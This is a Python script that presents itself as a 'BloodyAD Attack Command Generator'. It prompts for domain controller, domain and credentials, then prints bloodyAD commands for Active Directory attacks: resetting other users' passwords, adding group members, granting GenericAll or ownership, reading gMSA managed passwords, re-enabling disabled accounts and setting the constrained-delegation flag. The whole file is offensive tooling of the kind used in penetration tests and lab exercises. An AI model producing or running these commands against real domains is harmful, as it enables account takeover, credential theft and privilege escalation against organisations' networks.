import sys

def generate_bloodyAD_command(choice, **kwargs):
    if choice == "1":
        command = f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} get object {kwargs['target_username']}"
    elif choice == "2":
        command = f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add groupMember {kwargs['group_name']} {kwargs['member_to_add']}"
    elif choice == "3":
        command = f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set password {kwargs['target_username']} {kwargs['new_password']}"
    elif choice == "4":
        command = f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add genericAll {kwargs['DN']} {kwargs['target_username']}"
    elif choice == "5":
        command = f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} set owner {kwargs['target_group']} {kwargs['target_username']}"
    elif choice == "6":
        command = f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} get object {kwargs['target_username']} --attr msDS-ManagedPassword"
    elif choice == "7":
        command = f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} remove uac {kwargs['target_username']} -f ACCOUNTDISABLE"
    elif choice == "8":
        command = f"bloodyAD --host {kwargs['dc']} -d {kwargs['domain']} -u {kwargs['username']} -p {kwargs['password']} add uac {kwargs['target_username']} -f TRUSTED_TO_AUTH_FOR_DELEGATION"
    else:        
        command = "Invalid choice!"
    return command

def main():
    print("=== BloodyAD Attack Command Generator ===")
    print("Choose an attack vector:")
    print("1. Retrieve User Information")
    print("2. Add User To Group")
    print("3. Change Password")
    print("4. Give User GenericAll Rights")
    print("5. WriteOwner")
    print("6. ReadGMSAPassword")
    print("7. Enable a Disabled Account")
    print("8. Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag")
    choice_input = input("Enter your choice (e.g., 1, 2, 3, 4, 5, 6, 7, 8): ").strip()

    choices = {
        "1": "Retrieve User Information",
        "2": "Add User To Group",
        "3": "Change Password",
        "4": "Give User GenericAll Rights",
        "5": "WriteOwner",
        "6": "ReadGMSAPassword",
        "7": "Enable a Disabled Account",
        "8": "Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag"
    }

    # Validate choice
    if choice_input not in choices:
        print("Invalid choice. Please restart the program.")
        sys.exit(1)

    # Required inputs for the chosen action
    required_inputs = {
        "1": ["dc", "domain", "username", "password", "target_username"],
        "2": ["dc", "domain", "username", "password", "group_name", "member_to_add"],
        "3": ["dc", "domain", "username", "password", "target_username", "new_password"],
        "4": ["dc", "domain", "username", "password", "DN", "target_username"],
        "5": ["dc", "domain", "username", "password", "target_group", "target_username"],
        "6": ["dc", "domain", "username", "password", "target_username"],
        "7": ["dc", "domain", "username", "password", "target_username"],
        "8": ["dc", "domain", "username", "password", "target_username"]
    }

    # Collect inputs from the user
    inputs = {}
    for field in required_inputs[choice_input]:
        inputs[field] = input(f"Enter {field}: ").strip()

    # Generate and display the command
    try:
        command = generate_bloodyAD_command(choice_input, **inputs)
        print("\nGenerated Commands:")
        print(command)
    except KeyError as e:
        print(f"Missing required input: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
